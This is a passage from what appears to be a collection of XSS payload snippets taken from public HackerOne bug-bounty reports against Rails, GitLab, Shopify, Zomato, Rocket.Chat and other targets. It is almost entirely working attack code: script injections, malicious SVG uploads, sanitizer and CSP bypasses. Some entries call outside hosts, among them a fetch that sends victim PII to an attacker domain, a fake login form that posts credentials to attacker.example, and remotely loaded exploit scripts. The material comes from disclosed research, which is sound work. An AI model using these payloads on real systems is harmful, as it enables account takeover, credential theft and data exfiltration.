  "body": "blog%5Btitle%5D=aaa&blog%5Bbody%5D=" +encodeURIComponent(html_text)+ "&commit=Create+Blog",
  "method": "POST",
});
```

## 90. [#2931691](https://hackerone.com/reports/2931691)  -  ActionView sanitize helper bypass with noscript
*medium*

```ruby
<%= sanitize '<noscript><p id="</noscript><script>alert(1)</script>"></noscript>' %>
```

## 91. [#1818172](https://hackerone.com/reports/1818172)  -  reflected XSS in [www.equifax.com]
*medium*

```html
<script type="text/javascript">

var pageProduct = null;
window.onload = function(e){ 
		
		Analytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: "broook" , numOfSearchResultsReturned: 1});
	
}
</script>
```

## 92. [#1818172](https://hackerone.com/reports/1818172)  -  reflected XSS in [www.equifax.com]
*medium*

```html
<script type="text/javascript">

var pageProduct = null;
window.onload = function(e){ 
		
		Analytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: "" , internalSearchTerm: ["broook"].map(alert) , numOfSearchResultsReturned: "b" , numOfSearchResultsReturned: 1});
	
}
</script>
```

## 93. [#373950](https://hackerone.com/reports/373950)  -  Reflected Cross-Site Scripting in Serendipity (serendipity.SetCookie)
*medium*

```html
<script>
        $(document).ready(function() {
    {foreach $filter_import AS $f_import}
        serendipity.SetCookie("entrylist_filter_{$f_import}", "{$get_filter_{$f_import}}" )
    {/foreach}
    {foreach $sort_import AS $s_import}
        serendipity.SetCookie("entrylist_sort_{$s_import}", "{$get_sort_{$s_import}}" )
    {/foreach}
        });
    </script>
```

## 94. [#461272](https://hackerone.com/reports/461272)  -  [www.zomato.com] Blind XSS in one of the admin dashboard
*high, $500*

```http
POST ████ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 156
Host: api.zomato.com

█████="><img+src%3d"http%3a//<my_server_ip>/zomato.php%3fc%3dzomato_xss"+/>█████████
```

## 95. [#309367](https://hackerone.com/reports/309367)  -  [metascraper] Stored XSS in Open Graph meta properties read by metascrapper
*critical*

```html
<!doctype html>
<html xmlns:og="http://ogp.me/ns#" lang="en">

<head>
    <meta charset="utf8">
    <title>metascraper</title>

    <meta property="og:description" content="The HR startups go to war.">
    <meta property="og:image" content="image">
    <meta property="og:site_name" content='<script src="http://127.0.0.1:8080/malware.js"></script>'>
    <meta property="og:title" content="test article">
    <meta property="og:type" content="article">
    <meta property="og:url" content="http://127.0.0.1:8080">
</head>

<body>
</body>
</html>
```

## 96. [#2303609](https://hackerone.com/reports/2303609)  -  XSS when using `translate` in Action Controller (Rails 7.0, 7.1)
*low*

```html
<h1><%= @message %></h1>

<%# Confirm translate is escape in Action View %>
<p><%= t("<script>alert(location)</script>_html") %></p>
<p><%= t("message_html", default: "<script>alert(location)</script>") %></p>
```

## 97. [#474262](https://hackerone.com/reports/474262)  -  XSS due to incomplete JS escaping
*low*

```html
<script>let a = `<%= j '`+alert`' %>`</script>
```

## 98. [#474262](https://hackerone.com/reports/474262)  -  XSS due to incomplete JS escaping
*low*

```html
<script>let a = `<%= j '${alert()}' %>`</script>
```

## 99. [#453795](https://hackerone.com/reports/453795)  -  [harp] Unsafe rendering of Markdown files
*low*

```js
var TerraformError = require("../../error").TerraformError
var marked = require("marked").setOptions({
  langPrefix: 'language-',
  headerPrefix: '',
  gfm: true,
  tables: true,
})
var renderer = new marked.Renderer()
...
```

## 100. [#949513](https://hackerone.com/reports/949513)  -  XSS by file (Active Storage `Proxying`)
*medium, $500*

```xml
<svg xmlns='http://www.w3.org/2000/svg' width="200px" height="200px" onload="javascript:alert(location)">
```

## 101. [#880099](https://hackerone.com/reports/880099)  -  Unrestricted file upload leads to Stored XSS
*medium*

```xml
<svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg">
```

## 102. [#3606773](https://hackerone.com/reports/3606773)  -  Stored XSS via SVG Upload  -  check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)
*medium*

```http
POST /posting.php?mode=post&f=2 HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFFEaAfSerpQAkd4Q
x-requested-with: XMLHttpRequest
Cookie: ***********************************

------WebKitFormBoundaryFFEaAfSerpQAkd4Q
Content-Disposition: form-data; name="name"

dummy.jpg
------WebKitFormBoundaryFFEaAfSerpQAkd4Q
Content-Disposition: form-data; name="chunk"

0
------WebKitFormBoundaryFFEaAfSerpQAkd4Q
Content-Disposition: form-data; name="chunks"

1
------WebKitFormBoundaryFFEaAfSerpQAkd4Q
Content-Disposition: form-data; name="add_file"

Add the file
------WebKitFormBoundaryFFEaAfSerpQAkd4Q
Content-Disposition: form-data; name="creation_time"

YOUR_CREATION_TIME_HERE
------WebKitFormBoundaryFFEaAfSerpQAkd4Q
Content-Disposition: form-data; name="form_token"

YOUR_FORM_TOKEN_HERE
------WebKitFormBoundaryFFEaAfSerpQAkd4Q
Content-Disposition: form-data; name="real_filename"

xss_onload.svg
------WebKitFormBoundaryFFEaAfSerpQAkd4Q
Content-Disposition: form-data; name="fileupload"; filename="xss_onload.svg"
Content-Type: image/svg+xml

# … truncated …
```

## 103. [#3606773](https://hackerone.com/reports/3606773)  -  Stored XSS via SVG Upload  -  check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)
*medium*

```http
POST /posting.php?mode=post&f=2 HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryF4vyqZURwpTrUxKo
x-requested-with: XMLHttpRequest
Cookie: ***************************************

------WebKitFormBoundaryF4vyqZURwpTrUxKo
Content-Disposition: form-data; name="name"

dummy.jpg
------WebKitFormBoundaryF4vyqZURwpTrUxKo
Content-Disposition: form-data; name="chunk"

0
------WebKitFormBoundaryF4vyqZURwpTrUxKo
Content-Disposition: form-data; name="chunks"

1
------WebKitFormBoundaryF4vyqZURwpTrUxKo
Content-Disposition: form-data; name="add_file"

Add the file
------WebKitFormBoundaryF4vyqZURwpTrUxKo
Content-Disposition: form-data; name="creation_time"

YOUR_CREATION_TIME_HERE
------WebKitFormBoundaryF4vyqZURwpTrUxKo
Content-Disposition: form-data; name="form_token"

YOUR_FORM_TOKEN_HERE
------WebKitFormBoundaryF4vyqZURwpTrUxKo
Content-Disposition: form-data; name="real_filename"

xss-worm.svg
------WebKitFormBoundaryF4vyqZURwpTrUxKo
Content-Disposition: form-data; name="fileupload"; filename="xss-worm.svg"
Content-Type: image/svg+xml

# … truncated …
```

## 104. [#3606773](https://hackerone.com/reports/3606773)  -  Stored XSS via SVG Upload  -  check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)
*medium*

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS execution on: ' + document.domain)">
```

## 105. [#3606773](https://hackerone.com/reports/3606773)  -  Stored XSS via SVG Upload  -  check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)
*medium*

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="init()">
```

## 106. [#461272](https://hackerone.com/reports/461272)  -  [www.zomato.com] Blind XSS in one of the admin dashboard
*high, $500*

```http
Post data: "><img src="http://<my_server_ip>/zomato.php?c=zomato_xss" />

'''
```

## 107. [#461272](https://hackerone.com/reports/461272)  -  [www.zomato.com] Blind XSS in one of the admin dashboard
*high, $500*

```http
POST ████ HTTP/1.1
```

## 108. [#3608199](https://hackerone.com/reports/3608199)  -  DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover
*high, $500*

```http
POST /40002/users/03frq8zae2a7m9cari0v89xua/email_addresses
```

## 109. [#3608199](https://hackerone.com/reports/3608199)  -  DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover
*high, $500*

```http
GET /40002/
```

## 110. [#3608199](https://hackerone.com/reports/3608199)  -  DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover
*high, $500*

```http
POST /20002/my/access_tokens
```

## 111. [#3608199](https://hackerone.com/reports/3608199)  -  DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover
*high, $500*

```http
POST /20002/account/cancellation
```

## 112. [#3608199](https://hackerone.com/reports/3608199)  -  DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover
*high, $500*

```http
GET /40002/users/03frq8zae2a7m9cari0v89xua/edit
```

## 113. [#2257080](https://hackerone.com/reports/2257080)  -  Stored-XSS injected in Wiki page via Banzai pipeline
*high*

```ruby
def gen_payload( payload, based_url: "https://gitlab.com/gitlab-org/gitlab/-/issues/428268")
  payload    = "#{payload}#{based_url}" unless payload.include? based_url
  payload    = payload.gsub('<', '&lt;').gsub('>', '&gt;')

  es_payload = %(*<i><a href="http:#{ payload.gsub('"','&quot;') }" class="gfm">a</a></i>)
  es_payload = CGI.escape_html( es_payload ).gsub('%20', '%2520') #double encode space/tab/new_line

  a = %(<dl><a href="#{ based_url }#{ es_payload }">#{ based_url }*<i>[[a|http:#{ payload }]]</i></a></dl>)
  puts a
end

gen_payload %('"><svg><style>dl{visibility:hidden}<i/class=gl-show-field-errors><input/title="<script>alert(document.domain)</script>"/></style></svg>)
```

## 114. [#765679](https://hackerone.com/reports/765679)  -  Stored XSS on upload files leads to steal cookie
*high*

```xml
<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 width="2560.000000pt" height="1600.000000pt" viewBox="0 0 2560.000000 1600.000000"
 preserveAspectRatio="xMidYMid meet" onload="alert(document.cookie)">
```

## 115. [#1212822](https://hackerone.com/reports/1212822)  -  Stored XSS in Mermaid when viewing Markdown files
*high*

```mermaid
%%{init: {"flowchart": {"htmlLabels": "false"}} }%%
flowchart
  A["<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>"]
```

## 116. [#1212822](https://hackerone.com/reports/1212822)  -  Stored XSS in Mermaid when viewing Markdown files
*high*

```html
<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>
```

## 117. [#950190](https://hackerone.com/reports/950190)  -  Store-XSS in error message of build-dependencies
*high*

```yaml
test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>:
  stage: build
  script: 
    - date > index.html
  artifacts:
    paths: 
      - index.html
    expire_in: 1 second

job-test:
  stage: test
  script: echo "hi"
  dependencies: ["test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>"]
```

## 118. [#341044](https://hackerone.com/reports/341044)  -  [cloudcmd] Stored XSS in the filename when directories listing
*high*

```
bash$ touch '"><svg onload=alert(3);>'
```

## 119. [#474656](https://hackerone.com/reports/474656)  -  Cross-site Scripting (XSS) on HackerOne careers page
*low, $500*

```html
<script src="https://app-sj17.marketo.com/index.php/form/getForm?callback=alert"></script>
```

## 120. [#1276742](https://hackerone.com/reports/1276742)  -  Stored XSS in SVG file as data: url
*medium, $5,300*

```html
<svg onload="var req = new XMLHttpRequest(); req.open('GET', 'https://us-based-organization-h1.myshopify.com/admin', false); req.setRequestHeader('Upgrade-Insecure-Requests', '1');req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36') ;req.send(null);var headers = req.response.toLowerCase();console.log(headers);" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve" height="100px" width="100px">
<g>
	<path d="M28.1,36.6c4.6,1.9,12.2,1.6,20.9,1.1c8.9-0.4,19-0.9,28.9,0.9c6.3,1.2,11.9,3.1,16.8,6c-1.5-12.2-7.9-23.7-18.6-31.3   c-4.9-0.2-9.9,0.3-14.8,1.4C47.8,17.9,36.2,25.6,28.1,36.6z"/>
	<path d="M70.3,9.8C57.5,3.4,42.8,3.6,30.5,9.5c-3,6-8.4,19.6-5.3,24.9c8.6-11.7,20.9-19.8,35.2-23.1C63.7,10.5,67,10,70.3,9.8z"/>
	<path d="M16.5,51.3c0.6-1.7,1.2-3.4,2-5.1c-3.8-3.4-7.5-7-11-10.8c-2.1,6.1-2.8,12.5-2.3,18.7C9.6,51.1,13.4,50.2,16.5,51.3z"/>
	<path d="M9,31.6c3.5,3.9,7.2,7.6,11.1,11.1c0.8-1.6,1.7-3.1,2.6-4.6c0.1-0.2,0.3-0.4,0.4-0.6c-2.9-3.3-3.1-9.2-0.6-17.6   c0.8-2.7,1.8-5.3,2.7-7.4c-5.2,3.4-9.8,8-13.3,13.7C10.8,27.9,9.8,29.7,9,31.6z"/>
	<path d="M15.4,54.7c-2.6-1-6.1,0.7-9.7,3.4c1.2,6.6,3.9,13,8,18.5C13,69.3,13.5,61.8,15.4,54.7z"/>
	<path d="M39.8,57.6C54.3,66.7,70,73,86.5,76.4c0.6-0.8,1.1-1.6,1.7-2.5c4.8-7.7,7-16.3,6.8-24.8c-13.8-9.3-31.3-8.4-45.8-7.7   c-9.5,0.5-17.8,0.9-23.2-1.7c-0.1,0.1-0.2,0.3-0.3,0.4c-1,1.7-2,3.4-2.9,5.1C28.2,49.7,33.8,53.9,39.8,57.6z"/>
	<path d="M26.2,88.2c3.3,2,6.7,3.6,10.2,4.7c-3.5-6.2-6.3-12.6-8.8-18.5c-3.1-7.2-5.8-13.5-9-17.2c-1.9,8-2,16.4-0.3,24.7   C20.6,84.2,23.2,86.3,26.2,88.2z"/>
	<path d="M30.9,73c2.9,6.8,6.1,14.4,10.5,21.2c15.6,3,32-2.3,42.6-14.6C67.7,76,52.2,69.6,37.9,60.7C32,57,26.5,53,21.3,48.6   c-0.6,1.5-1.2,3-1.7,4.6C24.1,57.1,27.3,64.5,30.9,73z"/>
</g>
</svg>
# … truncated …
```

## 121. [#1805873](https://hackerone.com/reports/1805873)  -  Rails ActionView sanitize helper bypass leading to XSS using SVG tag.
*medium, $2,400*

```svg
<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='1337' height='1337'>
<image href="1" onerror="alert(window.origin)" />
</svg>
```

## 122. [#1599573](https://hackerone.com/reports/1599573)  -  Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag
*medium, $2,400*

```
input: <select<style/>W<xmp<script>alert(1)</script>
scrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :W
scrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :&lt;script&gt;alert(1)&lt;/script&gt;
scrub --> node type :Nokogiri::XML::Element, node name :xmp, node to_s :<xmp>&lt;script&gt;alert(1)&lt;/script&gt;</xmp>
scrub --> node type :Nokogiri::XML::Element, node name :style, node to_s :<style>W<script>alert(1)</script></style>
scrub --> node type :Nokogiri::XML::Element, node name :select, node to_s :<select><style>W<script>alert(1)</script></style></select>
output: <select><style>W<script>alert(1)</script></style></select>
```

## 123. [#1599573](https://hackerone.com/reports/1599573)  -  Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag
*medium, $2,400*

```http
puts "input: <select<style/>W<xmp<script>alert(1)</script>"
```

## 124. [#1599573](https://hackerone.com/reports/1599573)  -  Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag
*medium, $2,400*

```http
puts "output: "+Rails::Html::SafeListSanitizer.new.sanitize("<select<style/>W<xmp<script>alert(1)</script>", tags: tags).to_s
```

## 125. [#262230](https://hackerone.com/reports/262230)  -  Tinymce 2.4.0
*medium, $2,000*

```html
<HTML xmlns: ><audio>
<audio src=wp onerror=alert(0X1)>
```

## 126. [#2509022](https://hackerone.com/reports/2509022)  -  Reflected XSS in AI Chat Bot Greetings at help.shopify.com via Markdown Image Rendering
*medium, $1,600*

```javascript
// At worst, if no support conversation exists, we leak victims' PII to attacker's controlled domain
fetch(`//████████?${JSON.stringify(window.__remixContext.state.loaderData.root.userInfo)}`);

// Fetch victim's last support inbox conversation.
fetch("/messages/graphql", {
  "headers": {
	"content-type": "application/json",
	"x-shopify-react-xhr": "1"
  },
  "body": `{\"variables\":{},\"query\":\"query convs { conversations(last: 1) { edges { node { id } } } }\"}`,
  "method": "POST"
})
.then(response => response.text())
.then(data => {

   // Try to subscribe to the victim's conversation which will send an email to the attacker and allow him to join the conversation
	const cid = JSON.parse(data).data.conversations.edges[0].node.id ?? null;
	fetch("/messages/graphql", {
	  "headers": {
		"content-type": "application/json",
		"x-shopify-react-xhr": "1"
	  },
	  "body": `{\"variables\":{},\"query\":\"mutation subscriberCreate { subscriberCreate(conversationId: \\\\"${cid}\\\\", email: \\\\"saltymermaid@wearehackerone.com\\\\") { __typename }}\"}`,
	  "method": "POST"
	});

});
```

## 127. [#949513](https://hackerone.com/reports/949513)  -  XSS by file (Active Storage `Proxying`)
*medium, $500*

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns='http://www.w3.org/2000/svg' width="200px" height="200px" onload="javascript:alert(location)">
</svg>
```

## 128. [#632017](https://hackerone.com/reports/632017)  -  Self-Stored XSS - Chained with login/logout CSRF
*medium, $300*

```
review=140 characters long review&
review_db=140 characters long review&
with_tags_data=<script>prompt(0,document.domain)</script>&
res_id=19132208&
city_id=11333&
rating=5&
is_edit=0&
review_id=0&
save_image=1&
instagram_images_to_update=[]&
instagram_json_data={"data":[]}&
uploaded_images_json=[]&
share_to_fb=false&
share_to_tw=false&
snippet=restaurant-review&
web_source=default&
csrf_token=2acad4ba08d4000000000007923a25d&
external_url=
```

## 129. [#2038943](https://hackerone.com/reports/2038943)  -  [oem.acronis.com] Reflected Cross Site Scripting
*medium, $100*

```http
delete test page from your server

## Impact
```

## 130. [#2279346](https://hackerone.com/reports/2279346)  -  CSP bypass on PortSwigger.net using Google script resources
*medium*

```javascript
document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//joaxcar.com/hack.js&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>
</div>
">`
```

## 131. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```http
POST /api/v1/livechat/visitor      -  no auth, no CAPTCHA
```

## 132. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```html
<img src=x onerror="
  document.body.innerHTML='<div style=\'font-family:sans-serif;max-width:400px;margin:80px auto;padding:40px;border:1px solid #ddd;border-radius:8px\'>'
    +'<img src=https://rocket.chat/images/logo/logo-dark.svg width=200 style=margin-bottom:20px>'
    +'<h3>Session Expired</h3>'
    +'<p style=color:#666>Your session has expired. Please sign in again to view this export.</p>'
    +'<form action=https://attacker.example/creds method=POST>'
    +'<input name=user placeholder=Username style=\'width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px\'>'
    +'<input name=pass type=password placeholder=Password style=\'width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px\'>'
    +'<button style=\'width:100%;padding:12px;background:#1d74f5;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px\'>Sign In</button>'
    +'</form></div>';
  document.title='Rocket.Chat  -  Sign In';
">
```

## 133. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```http
POST /api/v1/livechat/message      -  no auth, only visitor token
```

## 134. [#439912](https://hackerone.com/reports/439912)  -  Stored XSS on demo app link
*medium*

```http
put the payload you see below:

{F374863}
```

## 135. [#490728](https://hackerone.com/reports/490728)  -  [takeapeek] XSS via HTML tag injection in directory lisiting page
*medium*

```bash
$ touch 'javascript:alert(1)'
```

## 136. [#665302](https://hackerone.com/reports/665302)  -  [seeftl] Stored XSS when directory listing via filename.
*medium*

```http
Put the mouse over the filename and the event will be triggered and pop up the alert.

{F544504}
```

## 137. [#1955370](https://hackerone.com/reports/1955370)  -  Incorrect handling of certain characters passed to the redirection functionality in Rails can lead to a single-click XSS vulnerability.
*medium*

```
HTTP/1.1 302 Found
Cache-Control: no-store
Date: Thu, 06 Apr 2023 05:16:21 GMT
Connection: close
Content-Length: 100

<html><body>You are being <a href="javascript:alert(document.cookie) ">redirected</a>.</body></html>
```

## 138. [#395845](https://hackerone.com/reports/395845)  -  url.parse() hostname spoofing via javascript: URIs
*medium*

```bash
$ node -e 'console.log(require("url").parse("javAscript:alert(1);a=\x27@white-listed.com\x27"))'
Url {
  protocol: 'javascript:',
  slashes: null,
  auth: 'alert(1);a=\'',
  host: 'white-listed.com',
  port: null,
  hostname: 'white-listed.com',
  hash: null,
  search: null,
  query: null,
  pathname: '\'',
  path: '\'',
  href: 'javascript:alert(1)%3Ba%3D\'@white-listed.com\'' }
```

## 139. [#691977](https://hackerone.com/reports/691977)  -  [reveal.js] XSS by calling arbitrary method via postMessage
*medium*

```html
<html>
    <head>
        <title>XSS</title>
        
		<style>
			iframe
			{
				width: 100%;
				height: 100%;
				border: none;
			}
		</style>
    </head>
    <body>
        <iframe name="reveal" src="https://revealjs.com" onload="xss()"></iframe>

        <script>
            var frame = window.frames.reveal
            
            function xss ()
            {
                frame.postMessage ('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img src=x onerror=alert(document.domain)>"}]}', '*')
                frame.postMessage ('{"method":"toggleHelp"}', '*')
            }
        </script>
    </body>
</html>
```

## 140. [#998398](https://hackerone.com/reports/998398)  -  Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)
*high*

```
t.deparam = h = function(e, n) {
            var i = {}
              , r = {
                "true": !0,
                "false": !1,
                "null": null
            };
            return t.each(e.replace(/\+/g, " ").split("&"), function(e, o) {
                var s, a = o.split("="), u = b(a[0]), c = i, h = 0, p = u.split("]["), f = p.length - 1;
                if (/\[/.test(p[0]) && /\]$/.test(p[f]) ? (p[f] = p[f].replace(/\]$/, ""),
                p = p.shift().split("[").concat(p),
                f = p.length - 1) : f = 0,
                2 === a.length)
                    if (s = b(a[1]),
                    n && (s = s && !isNaN(s) ? +s : "undefined" === s ? l : r[s] !== l ? r[s] : s),
                    f)
                        for (; h <= f; h++)
                            u = "" === p[h] ? c.length : p[h],
                            c = c[u] = h < f ? c[u] || (p[h + 1] && isNaN(p[h + 1]) ? {} : []) : s; //pollution here
                    else
                        t.isArray(i[u]) ? i[u].push(s) : i[u] !== l ? i[u] = [i[u], s] : i[u] = s;
                else
                    u && (i[u] = n ? l : "")
            }),
            i
        }
```

## 141. [#868615](https://hackerone.com/reports/868615)  -  Inject page in admin panel via Shopify.API.pushState with protocol invalid
*low, $500*

```http
Get tokens.
```

## 142. [#389592](https://hackerone.com/reports/389592)  -  [theacademy.upserve.com] Reflected XSS Query-String
*low, $250*

```http
GET /roles/?%22%3E%3Cscript//src=data&colon;,alert(location)// HTTP/1.1
Host: theacademy.upserve.com
```

## 143. [#1502099](https://hackerone.com/reports/1502099)  -  Reflected XSS in OAuth complete endpoints
*low, $150*

```http
GET /oauth/{service:[A-Za-z0-9]+}/complete
```

## 144. [#1502099](https://hackerone.com/reports/1502099)  -  Reflected XSS in OAuth complete endpoints
*low, $150*

```http
GET /api/v3/oauth/{service:[A-Za-z0-9]+}/complete
```

## 145. [#1502099](https://hackerone.com/reports/1502099)  -  Reflected XSS in OAuth complete endpoints
*low, $150*

```http
GET /signup/{service:[A-Za-z0-9]+}/complete
```

## 146. [#1502099](https://hackerone.com/reports/1502099)  -  Reflected XSS in OAuth complete endpoints
*low, $150*

```http
GET /login/{service:[A-Za-z0-9]+}/complete
```

## 147. [#335481](https://hackerone.com/reports/335481)  -  [Zomato's Blog] POST based XSS on https://www.zomato.com/blog/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=8.2
*low, $100*

```http
POST based XSS 

##Vulnerable URL:
```

## 148. [#192667](https://hackerone.com/reports/192667)  -  [stagecafrstore.starbucks.com] CRLF Injection, XSS
*low*

```http
HTTP/1.1 301 Content-moved
Date: Tue, 20 Dec 2016 08:40:11 GMT
Server: WebServer
X-Original-link: /%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
X-XSS-Protection: 0
Location: //x:1
Content-Type: text/html
Content-Length: 98

<script>alert(document.domain)</script>
Content-Length: 0
X-OneLinkServiceType: onelink.fcgi
```

## 149. [#437863](https://hackerone.com/reports/437863)  -  SVG file that HTML Included is able to upload via File Manager
*low*

```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 96 105">
<html><head><title>test</title></head><body><script>alert('xss');</script></body></html>
</svg>
```

## 150. [#1687410](https://hackerone.com/reports/1687410)  -  [user_oidc] Stored XSS via Authorization Endpoint - Safari-Only
*low*

```http
HTTP/1.1 200 OK
Date: Wed, 31 Aug 2022 12:47:57 GMT
Server: Apache/2.4.54 (Debian)
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Robots-Tag: none
X-XSS-Protection: 1; mode=block
X-Powered-By: PHP/8.0.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';frame-ancestors 'none'
X-Request-Id: yUWr3aQshJ5OHyMuzG1j
Feature-Policy: autoplay 'none';camera 'none';fullscreen 'none';geolocation 'none';microphone 'none';payment 'none'
Content-Disposition: inline; filename=""
Vary: Accept-Encoding
Content-Length: 492
Connection: close
Content-Type: text/html; charset=UTF-8

<meta http-equiv="refresh" content="0; url='" http-equiv=><svg/onload=alert(document.domain)>?client_id=test.local&response_type=code&scope=openid+email+profile&redirect_uri=http%3A%2F%2Flocalhost%3A8081%2Fapps%2Fuser_oidc%2Fcode&claims=%7B%22id_token%22%3A%7B%22email%22%3Anull%2C%22name%22%3Anull%2C%22quota%22%3Anull%7D%2C%22userinfo%22%3A%7B%22email%22%3Anull%2C%22name%22%3Anull%2C%22quota%22%3Anull%7D%7D&state=FB8IZL2JE55LJ1Y5HJAINPY6OTDQ16P1&nonce=356M5O3J1PKMRKJNBKE40RUGJA06O40E" />
# … truncated …
```

## 151. [#1823216](https://hackerone.com/reports/1823216)  -  XSS vulnerability without a content security bypass in a `CUSTOM` App through Button tag
*medium, $2,000*

```python
import { Box, ContextView, Inline, Link } from "@stripe/ui-extension-sdk/ui";
import type { ExtensionContextValue } from "@stripe/ui-extension-sdk/context";
import {Button} from '@stripe/ui-extension-sdk/ui';
import {Img} from '@stripe/ui-extension-sdk/ui'
import {Chip, ChipList} from '@stripe/ui-extension-sdk/ui';

import BrandIcon from "./brand_icon.svg";

/**
 * This is a view that is rendered in the Stripe dashboard's customer detail page.
 * In stripe-app.json, this view is configured with stripe.dashboard.customer.detail viewport.
 * You can add a new view by running "stripe apps add view" from the CLI.
 */

const App = ({ userContext, environment }: ExtensionContextValue) => {
  return (
    <ContextView
      title="XSS POC"
      brandColor="#F6F8FA" // replace this with your brand color
      brandIcon={BrandIcon} // replace this with your brand icon
    >
	  
	  <Button href="javascript://%0aalert(123)">
		XSS with %0a
	  </Button>
	  <Button href="javascript://%0dalert(document.domain)">
		XSS with %0d
	  </Button>
	  
    </ContextView>
  );
};

export default App;
```

## 152. [#1238528](https://hackerone.com/reports/1238528)  -  wp-embed XSS on Safari
*medium*

```javascript
if (c.wp.receiveEmbedMessage = function(e) {
            var t = e.data;
            if (t)
                if (t.secret || t.message || t.value)
                    if (!/[^a-zA-Z0-9]/.test(t.secret)) {
                        for (var r, a, i, s = d.querySelectorAll('iframe[data-secret="' + t.secret + '"]'), n = d.querySelectorAll('blockquote[data-secret="' + t.secret + '"]'), o = 0; o < n.length; o++)
                            n[o].style.display = "none";
                        for (o = 0; o < s.length; o++)
                            if (r = s[o],
                            e.source === r.contentWindow) {
                                if (r.removeAttribute("style"),
                                "height" === t.message) {
                                    if (1e3 < (i = parseInt(t.value, 10)))
                                        i = 1e3;
                                    else if (~~i < 200)
                                        i = 200;
                                    r.height = i
                                }
                                if ("link" === t.message)
                                    if (a = d.createElement("a"),
                                    i = d.createElement("a"),
                                    a.href = r.getAttribute("src"),
                                    i.href = t.value,
                                    i.host === a.host)
                                        if (d.activeElement === r)
                                            c.top.location.href = t.value
                            }
                    }
        }
# … truncated …
```

## 153. [#153618](https://hackerone.com/reports/153618)  -  Reflected XSS via #tags= while using a callback in newswire  http://www.rockstargames.com/newswire
*medium*

```
../../comments_dal/users/getGlobalLoginSettings.json?callback=alert%28document.domain%
```

## 154. [#3608199](https://hackerone.com/reports/3608199)  -  DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover
*high, $500*

```bash
curl -s -i -c /workspace/victim_ato.cookies -X POST \
  -d email_address=victim@example.com \
  http://172.17.0.7:3000/session
```

## 155. [#1665658](https://hackerone.com/reports/1665658)  -  Stored-XSS with CSP-bypass via labels' color
*high*

```bash
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
